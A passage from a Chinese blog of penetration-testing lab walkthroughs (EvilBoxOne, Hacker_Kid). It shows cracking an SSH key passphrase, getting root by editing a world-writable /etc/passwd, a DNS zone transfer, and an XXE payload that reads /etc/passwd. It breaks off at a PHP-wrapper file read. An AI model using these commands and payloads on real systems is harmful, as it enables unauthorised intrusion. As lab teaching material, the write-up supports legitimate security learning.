<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">[root@kali /tmp]# john hash <span class="comment">--wordlist=rockyou.txt</span></span><br><span class="line"><span class="keyword">Using</span> <span class="keyword">default</span> <span class="keyword">input</span> <span class="keyword">encoding</span>: UTF<span class="number">-8</span></span><br><span class="line">Loaded <span class="number">1</span> <span class="keyword">password</span> hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) <span class="number">32</span>/<span class="number">64</span>])</span><br><span class="line"><span class="keyword">Cost</span> <span class="number">1</span> (KDF/cipher [<span class="number">0</span>=MD5/AES <span class="number">1</span>=MD5/<span class="number">3</span>DES <span class="number">2</span>=Bcrypt/AES]) <span class="keyword">is</span> <span class="number">1</span> <span class="keyword">for</span> <span class="keyword">all</span> loaded hashes</span><br><span class="line"><span class="keyword">Cost</span> <span class="number">2</span> (iteration count) <span class="keyword">is</span> <span class="number">2</span> <span class="keyword">for</span> <span class="keyword">all</span> loaded hashes</span><br><span class="line">Will run <span class="number">4</span> OpenMP threads</span><br><span class="line">Note: This <span class="keyword">format</span> may emit <span class="keyword">false</span> positives, so it will keep trying even <span class="keyword">after</span></span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> <span class="keyword">or</span> Ctrl-C <span class="keyword">to</span> <span class="keyword">abort</span>, almost <span class="keyword">any</span> other key <span class="keyword">for</span> status</span><br><span class="line">unicorn          (/tmp/id_rsa)</span><br><span class="line"><span class="built_in">Warning</span>: <span class="keyword">Only</span> <span class="number">2</span> candidates left, minimum <span class="number">4</span> needed <span class="keyword">for</span> performance.</span><br><span class="line"><span class="number">1</span>g <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">08</span> DONE (<span class="number">2022</span><span class="number">-11</span><span class="number">-18</span> <span class="number">05</span>:<span class="number">18</span>) <span class="number">0.1142</span>g/s <span class="number">1639</span>Kp/s <span class="number">1639</span>Kc/s <span class="number">1639</span>KC/sa6_123..*<span class="number">7</span>¡Vamos!</span><br><span class="line"><span class="keyword">Session</span> completed</span><br></pre></td></tr></table></figure>

<p>破解出了加密密码unicorn</p>
</li>
</ul>
<p>再次登录</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">[root<span class="variable">@kali</span> /tmp]<span class="comment"># ssh mowree@172.16.42.206 -i ./id_rsa</span></span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">&#x27;./id_rsa&#x27;</span>:</span><br><span class="line">Linux EvilBoxOne <span class="number">4.19</span>.0<span class="number">-17</span>-amd64 <span class="comment">#1 SMP Debian 4.19.194-3 (2021-07-18) x86_64</span></span><br><span class="line">mowree<span class="variable">@EvilBoxOne</span><span class="symbol">:~</span>$</span><br></pre></td></tr></table></figure>

<p>成功。</p>
<p>第一个flag</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">mowree<span class="variable">@EvilBoxOne</span><span class="symbol">:~</span><span class="variable">$ </span>cat user.txt</span><br><span class="line"><span class="number">56</span>Rbp0soobpzWSVzKh9YOvzGLgtPZQ</span><br></pre></td></tr></table></figure>





<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">mowree</span>@EvilBoxOne:~$ uname -a</span><br><span class="line"><span class="attribute">Linux</span> EvilBoxOne <span class="number">4</span>.<span class="number">19</span>.<span class="number">0</span>-<span class="number">17</span>-amd<span class="number">64</span> #<span class="number">1</span> SMP Debian <span class="number">4</span>.<span class="number">19</span>.<span class="number">194</span>-<span class="number">3</span> (<span class="number">2021</span>-<span class="number">07</span>-<span class="number">18</span>) x<span class="number">86</span>_<span class="number">64</span> GNU/Linux</span><br></pre></td></tr></table></figure>

<p>搜索内核漏洞</p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@kali</span> ~]<span class="meta"># searchsploit linux 4.19</span></span><br></pre></td></tr></table></figure>



<p>没有利用成功</p>
<h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p>命令： <code>find / -perm /4000 2&gt;/dev/null</code></p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">mowree@EvilBoxOne:~$ <span class="keyword">find</span> <span class="regexp">/ -perm /</span><span class="number">4000</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="keyword">null</span></span><br><span class="line"></span><br><span class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/openssh/</span>ssh-keysign</span><br><span class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/eject/</span>dmcrypt-get-device</span><br><span class="line"><span class="regexp">/usr/</span>lib<span class="regexp">/dbus-1.0/</span>dbus-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/</span>bin/mount</span><br><span class="line"><span class="regexp">/usr/</span>bin/newgrp</span><br><span class="line"><span class="regexp">/usr/</span>bin/passwd</span><br><span class="line"><span class="regexp">/usr/</span>bin/umount</span><br><span class="line"><span class="regexp">/usr/</span>bin/chfn</span><br><span class="line"><span class="regexp">/usr/</span>bin/chsh</span><br><span class="line"><span class="regexp">/usr/</span>bin/gpasswd</span><br><span class="line"><span class="regexp">/usr/</span>bin/su</span><br></pre></td></tr></table></figure>

<p>没有可用的，都是默认的</p>
<p>查看sgid</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">mowree@EvilBoxOne:~$ <span class="keyword">find</span> <span class="regexp">/ -perm /</span><span class="number">2000</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="keyword">null</span></span><br><span class="line"><span class="regexp">/run/</span>log/journal</span><br><span class="line"><span class="regexp">/run/</span>log<span class="regexp">/journal/</span>e24bbdcfd6de4ae7a8b91fa945905e5b</span><br><span class="line"><span class="regexp">/usr/</span>sbin/unix_chkpwd</span><br><span class="line"><span class="regexp">/usr/</span>bin/bsd-<span class="keyword">write</span></span><br><span class="line"><span class="regexp">/usr/</span>bin/dotlockfile</span><br><span class="line"><span class="regexp">/usr/</span>bin/chage</span><br><span class="line"><span class="regexp">/usr/</span>bin/expiry</span><br><span class="line"><span class="regexp">/usr/</span>bin/wall</span><br><span class="line"><span class="regexp">/usr/</span>bin/crontab</span><br><span class="line"><span class="regexp">/usr/</span>bin/ssh-agent</span><br><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>python2.<span class="number">7</span></span><br><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>python2.<span class="number">7</span>/dist-packages</span><br><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>python2.<span class="number">7</span>/site-packages</span><br><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>python3.<span class="number">7</span></span><br><span class="line"><span class="regexp">/usr/</span>local<span class="regexp">/lib/</span>python3.<span class="number">7</span>/dist-packages</span><br><span class="line"><span class="regexp">/var/m</span>ail</span><br><span class="line"><span class="regexp">/var/</span>local</span><br></pre></td></tr></table></figure>

<p>也没有异常。</p>
<h3 id="写入文件提权"><a href="#写入文件提权" class="headerlink" title="写入文件提权"></a>写入文件提权</h3><p>找可写权限，并且排除掉proc目录（该目录太多了，扰乱视线）</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">find</span> <span class="regexp">/ -writable 2&gt;/</span>dev/<span class="keyword">null</span> | <span class="keyword">grep</span> -v proc</span><br></pre></td></tr></table></figure>

<p>发现/etc/passwd可写入。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mowree@EvilBoxOne:~$ ls -l <span class="regexp">/etc/</span>passwd</span><br><span class="line">-rw-rw-rw- <span class="number">1</span> root root <span class="number">1398</span> ago <span class="number">16</span>  <span class="number">2021</span> <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>

<p>可用看见任何用户都是可写的。</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">mowree:</span><span class="symbol">x:</span><span class="number">1000</span><span class="symbol">:</span><span class="number">1000</span><span class="symbol">:mowree</span>,,,<span class="symbol">:/home/mowree</span><span class="symbol">:/bin/bash</span></span><br><span class="line"></span><br><span class="line">用户名称<span class="symbol">:</span>密码(安全考虑，linux都将密码放到另一个文件/etc/shadow)<span class="symbol">:</span>用户<span class="symbol">id:</span>组<span class="symbol">id:</span>其他信息<span class="symbol">:</span>主目录<span class="symbol">:</span>登录后默认shell</span><br></pre></td></tr></table></figure>

<p>如果我们将x替换为密码，就可以生效。</p>
<p>使用openssl生成123的密码，-1是指一种加密算法</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">mowree<span class="variable">@EvilBoxOne</span><span class="symbol">:~</span><span class="variable">$ </span>openssl passwd <span class="number">-1</span></span><br><span class="line"><span class="symbol">Password:</span></span><br><span class="line">Verifying - <span class="symbol">Password:</span></span><br><span class="line"><span class="variable">$1</span><span class="variable">$ZDTsBsag</span><span class="variable">$KEzTiDFkq7JxWKpWltQ8h0</span></span><br></pre></td></tr></table></figure>



<p>vi /etc/passwd将root账号密码替换成生成的密码</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root:</span><span class="variable">$1</span><span class="variable">$ZDTsBsag</span><span class="variable">$KEzTiDFkq7JxWKpWltQ8h0</span><span class="symbol">:</span>0<span class="symbol">:</span>0<span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br></pre></td></tr></table></figure>



<p>su到root用户</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">mowree<span class="variable">@EvilBoxOne</span><span class="symbol">:~</span><span class="variable">$ </span>su root</span><br><span class="line">Contraseñ<span class="symbol">a:</span></span><br><span class="line"><span class="comment">#输入密码123</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取flag</span></span><br><span class="line">root<span class="variable">@EvilBoxOne</span><span class="symbol">:/home/mowree</span><span class="comment"># cd</span></span><br><span class="line">root<span class="variable">@EvilBoxOne</span><span class="symbol">:~</span><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>



<p>读取flag</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">root<span class="variable">@EvilBoxOne</span><span class="symbol">:~</span><span class="comment"># cat root.txt</span></span><br><span class="line"><span class="number">36</span>QtXfdJWvdC0VavlPIApUbDlqTsBM</span><br></pre></td></tr></table></figure>



<p>读取成功</p>
]]></content>
      <categories>
        <category>红队技术</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>打靶练习7-Hakcer_Kid</title>
    <url>/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A07-Hakcer-Kid/</url>
    <content><![CDATA[<p>dns域传送 | XXE注入 | php封装器 | SSTI模板注入 | python Capabilities提权</p>
<span id="more"></span>



<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><h3 id="arp局域网扫描"><a href="#arp局域网扫描" class="headerlink" title="arp局域网扫描"></a>arp局域网扫描</h3><figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="string">[root@kali ~]</span># sudo arp-scan -l</span><br><span class="line"></span><br><span class="line">Interface: eth0, type: EN10MB, MAC: <span class="number">00</span>:0c:<span class="number">29</span>:<span class="number">03</span>:ac:<span class="number">71</span>, IPv4: <span class="number">172</span>.<span class="number">16</span>.<span class="number">42</span>.<span class="number">147</span></span><br><span class="line">Starting arp-scan <span class="number">1</span>.<span class="number">9</span>.<span class="number">7</span> with <span class="number">256</span> hosts (https://github.com/royhills/arp-scan)</span><br><span class="line"><span class="number">172.16.42.1</span>	<span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:c0:<span class="number">00</span>:<span class="number">08</span>	VMware, Inc.</span><br><span class="line"><span class="number">172.16.42.2</span>	<span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:fd:8b:c9	VMware, Inc.</span><br><span class="line"><span class="number">172.16.42.207</span>	<span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:eb:<span class="number">89</span>:<span class="number">45</span>	PCS Systemtechnik GmbH</span><br><span class="line"><span class="number">172.16.42.254</span>	<span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:e2:0c:<span class="number">93</span>	VMware, Inc.</span><br></pre></td></tr></table></figure>

<p>确定172.16.42.207为目标机器。</p>
<h3 id="nmap全端口扫描"><a href="#nmap全端口扫描" class="headerlink" title="nmap全端口扫描"></a>nmap全端口扫描</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">[root@kali ~]# sudo <span class="keyword">nmap</span> -<span class="keyword">p</span>- <span class="number">172.16</span>.<span class="number">42.207</span></span><br><span class="line">Starting Nmap <span class="number">7.91</span> ( http<span class="variable">s:</span>//<span class="keyword">nmap</span>.org ) at <span class="number">2022</span>-<span class="number">11</span>-<span class="number">18</span> <span class="number">23</span>:<span class="number">19</span> EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">172.16</span>.<span class="number">42.207</span></span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00052</span>s latency).</span><br><span class="line">Not shown: <span class="number">65532</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">53</span>/tcp   <span class="keyword">open</span>  domain</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">9999</span>/tcp <span class="keyword">open</span>  abyss</span><br></pre></td></tr></table></figure>





<h3 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h3><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[root@kali ~]</span># <span class="selector-tag">sudo</span> <span class="selector-tag">nmap</span> <span class="selector-tag">-p53</span>,<span class="selector-tag">80</span>,<span class="selector-tag">9999</span> <span class="selector-tag">172</span><span class="selector-class">.16</span><span class="selector-class">.42</span><span class="selector-class">.207</span> <span class="selector-tag">-sV</span></span><br><span class="line"><span class="selector-tag">Starting</span> <span class="selector-tag">Nmap</span> <span class="selector-tag">7</span><span class="selector-class">.91</span> ( <span class="attribute">https</span>:<span class="comment">//nmap.org ) at 2022-11-18 23:21 EST</span></span><br><span class="line">Nmap scan report for <span class="number">172.16</span>.<span class="number">42.207</span></span><br><span class="line">Host is up (<span class="number">0.00055s</span> latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">53</span>/tcp   open  domain  ISC BIND <span class="number">9.16</span>.<span class="number">1</span> (Ubuntu Linux)</span><br><span class="line"><span class="number">80</span>/tcp   open  http    Apache httpd <span class="number">2.4</span>.<span class="number">41</span> ((Ubuntu))</span><br><span class="line"><span class="number">9999</span>/tcp open  http    Tornado httpd <span class="number">6.1</span></span><br><span class="line">MAC <span class="attribute">Address</span>: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="attribute">EB</span>:<span class="number">89</span>:<span class="number">45</span> (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service <span class="attribute">Info</span>: <span class="attribute">OS</span>: Linux; <span class="attribute">CPE</span>: <span class="attribute">cpe</span>:/<span class="attribute">o</span>:<span class="attribute">linux</span>:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at <span class="attribute">https</span>:<span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">Nmap <span class="attribute">done</span>: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">7.25</span> seconds</span><br></pre></td></tr></table></figure>

<p>Tornado是一个Python开发的web服务，比django轻量，速度快</p>
<h2 id="外部突破"><a href="#外部突破" class="headerlink" title="外部突破"></a>外部突破</h2><h3 id="53端口的dns服务"><a href="#53端口的dns服务" class="headerlink" title="53端口的dns服务"></a>53端口的dns服务</h3><p><strong>域名解析通常是53端口，但是都是用的udp53端口。dns服务器上一般tcp的53端口也是开放的，一般tcp53端口用于同一个域的的不同dns服务器做数据同步。我们日常通过域名查询ip是走udp的53端口。但是我们用nmap默认只扫描53的tcp端口</strong></p>
<h3 id="nmap-udp扫描"><a href="#nmap-udp扫描" class="headerlink" title="nmap udp扫描"></a>nmap udp扫描</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">[root@kali ~]# <span class="keyword">nmap</span> -p53 -sU <span class="number">172.16</span>.<span class="number">42.207</span> -sV</span><br><span class="line">Starting Nmap <span class="number">7.91</span> ( http<span class="variable">s:</span>//<span class="keyword">nmap</span>.org ) at <span class="number">2022</span>-<span class="number">11</span>-<span class="number">18</span> <span class="number">23</span>:<span class="number">31</span> EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">172.16</span>.<span class="number">42.207</span></span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.00084</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">53</span>/udp <span class="keyword">open</span>  domain  ISC BIND <span class="number">9.16</span>.<span class="number">1</span> (Ubuntu Linux)</span><br></pre></td></tr></table></figure>

<p>确定53端口的udp服务也是开放的。</p>
<h3 id="删除url的-号"><a href="#删除url的-号" class="headerlink" title="删除url的#号"></a>删除url的#号</h3><p>访问<a href="http://172.16.42.207/#app.html%EF%BC%8C%E5%88%A0%E9%99%A4#%E5%8F%B7%EF%BC%8C%E5%86%8D%E8%AE%BF%E9%97%AE">http://172.16.42.207/#app.html，删除#号，再访问</a></p>
<h3 id="查看首页源码"><a href="#查看首页源码" class="headerlink" title="查看首页源码"></a>查看首页源码</h3><p>发现如下注释</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;div class=&quot;container py-5&quot;&gt;</span></span><br><span class="line"><span class="comment">  &lt;h1&gt;Thanks&lt;/h1&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> TO DO: Use a GET parameter page_no  to view pages.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Optional JavaScript --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- jQuery first, then Popper.js, then Bootstrap JS --&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="爆破page-no"><a href="#爆破page-no" class="headerlink" title="爆破page_no"></a>爆破page_no</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">172.16.42.207</span>/?page_no=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>page_no=21的时候，出现如下</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">Okay so you want <span class="keyword">me</span> <span class="keyword">to</span> speak something ?</span><br><span class="line">I am a hacker kid <span class="keyword">not</span> a dumb hacker. So i created <span class="keyword">some</span> subdomains <span class="keyword">to</span> <span class="literal">return</span> <span class="keyword">back</span> <span class="keyword">on</span> <span class="keyword">the</span> server whenever i want!!</span><br><span class="line">Out <span class="keyword">of</span> <span class="keyword">my</span> many homes...one such home..one such home <span class="keyword">for</span> <span class="keyword">me</span> : hackers.blackhat.<span class="keyword">local</span></span><br></pre></td></tr></table></figure>

<p>提示了放了多个后门域名，其中有<code> hackers.blackhat.local</code>域名。</p>
<p>对于同一个ip，同一个端口，其实也可以通过不同的域名访问不同的系统。叫做虚拟主机。</p>
<p>我们可以编辑/etc/hosts添加域名对应ip，也可以抓包替换host。</p>
<p>当我们访问hackers.blackhat.local没发现不同，blackhat.local是403。</p>
<h3 id="DNS-axfr-攻击（DNS域传输漏洞）"><a href="#DNS-axfr-攻击（DNS域传输漏洞）" class="headerlink" title="DNS axfr 攻击（DNS域传输漏洞）"></a>DNS axfr 攻击（DNS域传输漏洞）</h3><p>可以对一个dns服务器发一个axfr请求，如果服务器支持，就会返回指定域的所有dns主机记录。</p>
<p>对于一个正常的dns服务器，他的axfr请求应该是服务器直接通过53tcp端口进行数据传输用的。</p>
<p>使用dig命令请求</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">[root@kali ~]# dig axfr @<span class="number">172.16</span><span class="number">.42</span><span class="number">.207</span> blackhat.<span class="keyword">local</span></span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG <span class="number">9.16</span><span class="number">.11</span>-Debian &lt;&lt;&gt;&gt; axfr @<span class="number">172.16</span><span class="number">.42</span><span class="number">.207</span> blackhat.<span class="keyword">local</span></span><br><span class="line">; (<span class="number">1</span> <span class="keyword">server</span> <span class="built_in">found</span>)</span><br><span class="line">;; <span class="keyword">global</span> <span class="keyword">options</span>: +cmd</span><br><span class="line">blackhat.<span class="keyword">local</span>.		<span class="number">10800</span>	<span class="keyword">IN</span>	SOA	blackhat.<span class="keyword">local</span>. hackerkid.blackhat.<span class="keyword">local</span>. <span class="number">1</span> <span class="number">10800</span> <span class="number">3600</span> <span class="number">604800</span> <span class="number">3600</span></span><br><span class="line">blackhat.<span class="keyword">local</span>.		<span class="number">10800</span>	<span class="keyword">IN</span>	NS	ns1.blackhat.<span class="keyword">local</span>.</span><br><span class="line">blackhat.<span class="keyword">local</span>.		<span class="number">10800</span>	<span class="keyword">IN</span>	MX	<span class="number">10</span> mail.blackhat.<span class="keyword">local</span>.</span><br><span class="line">blackhat.<span class="keyword">local</span>.		<span class="number">10800</span>	<span class="keyword">IN</span>	A	<span class="number">192.168</span><span class="number">.14</span><span class="number">.143</span></span><br><span class="line">ftp.blackhat.<span class="keyword">local</span>.	<span class="number">10800</span>	<span class="keyword">IN</span>	CNAME	blackhat.<span class="keyword">local</span>.</span><br><span class="line">hacker.blackhat.<span class="keyword">local</span>.	<span class="number">10800</span>	<span class="keyword">IN</span>	CNAME	hacker.blackhat.<span class="keyword">local</span>.blackhat.<span class="keyword">local</span>.</span><br><span class="line">mail.blackhat.<span class="keyword">local</span>.	<span class="number">10800</span>	<span class="keyword">IN</span>	A	<span class="number">192.168</span><span class="number">.14</span><span class="number">.143</span></span><br><span class="line">ns1.blackhat.<span class="keyword">local</span>.	<span class="number">10800</span>	<span class="keyword">IN</span>	A	<span class="number">192.168</span><span class="number">.14</span><span class="number">.143</span></span><br><span class="line">ns2.blackhat.<span class="keyword">local</span>.	<span class="number">10800</span>	<span class="keyword">IN</span>	A	<span class="number">192.168</span><span class="number">.14</span><span class="number">.143</span></span><br><span class="line">www.blackhat.<span class="keyword">local</span>.	<span class="number">10800</span>	<span class="keyword">IN</span>	CNAME	blackhat.<span class="keyword">local</span>.</span><br><span class="line">blackhat.<span class="keyword">local</span>.		<span class="number">10800</span>	<span class="keyword">IN</span>	SOA	blackhat.<span class="keyword">local</span>. hackerkid.blackhat.<span class="keyword">local</span>. <span class="number">1</span> <span class="number">10800</span> <span class="number">3600</span> <span class="number">604800</span> <span class="number">3600</span></span><br><span class="line">;; Query <span class="type">time</span>: <span class="number">3</span> msec</span><br><span class="line">;; <span class="keyword">SERVER</span>: <span class="number">172.16</span><span class="number">.42</span><span class="number">.207</span>#<span class="number">53</span>(<span class="number">172.16</span><span class="number">.42</span><span class="number">.207</span>)</span><br><span class="line">;; <span class="keyword">WHEN</span>: Sat Nov <span class="number">19</span> <span class="number">03</span>:<span class="number">17</span>:<span class="number">55</span> EST <span class="number">2022</span></span><br><span class="line">;; XFR size: <span class="number">11</span> records (messages <span class="number">1</span>, bytes <span class="number">353</span>)</span><br></pre></td></tr></table></figure>



<p>替换host为发现的Host头<code>hackerkid.blackhat.local</code></p>
<figure class="highlight plaintext"><figcaption><span>/ HTTP/1.1</span></figcaption><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: hackerkid.blackhat.local</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>返回了新的页面。</p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/18.jpg"></p>
<h3 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h3><p>通过提交上述页面抓包。为了正常在浏览器操作。我们还是要在本地绑定dns解析。</p>
<p>再次通过浏览器访问。</p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/19.jpg"></p>
<p>抓到如下数据包</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/process.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>hackerkid.blackhat.local</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain;charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>122</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://hackerkid.blackhat.local</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://hackerkid.blackhat.local/</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">name</span>&gt;</span>a<span class="tag">&lt;/<span class="name">name</span>&gt;</span><span class="tag">&lt;<span class="name">tel</span>&gt;</span>a<span class="tag">&lt;/<span class="name">tel</span>&gt;</span><span class="tag">&lt;<span class="name">email</span>&gt;</span>a@qq.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><strong>可以看见提交的<u>xml格式</u>的数据，并且我们<u>不管在emai插入任何字段，服务器都原封不动的返回</u>。于是猜测存在返回型xxe漏洞。</strong></p>
<p>使用CyberChef的xml美化功能，美化一下为</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>a<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">tel</span>&gt;</span>a<span class="tag">&lt;/<span class="name">tel</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">email</span>&gt;</span>a@qq.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>插入引入外部实体的代码。</p>
<p><code>&lt;!DOCTYPE foo [&lt;!ENTITY xxetest SYSTEM &#39;file:///etc/passwd&#39;&gt;]&gt;</code></p>
<p>由<strong>于只有email处有回显，所以写成<code>&amp;xxetest;</code>，这样就能看到引入的外部实体文件的结果了。</strong></p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/20.jpg"></p>
<h3 id="可登录账号"><a href="#可登录账号" class="headerlink" title="可登录账号"></a>可登录账号</h3><p>通过搜索/bin/bash，可以确定哪些账号可以通过ssh登录，如下，可以确定root和saket。</p>
<p><img src="../images/pics/%E6%89%93%E9%9D%B6/21.jpg"></p>
<h3 id="php封装器读取bashrc"><a href="#php封装器读取bashrc" class="headerlink" title="php封装器读取bashrc"></a>php封装器读取bashrc</h3><p>尝试读取了很多文件，但是只用/home/saket/.bashrc比较有用。</p>
<p>这里直接读取</p>
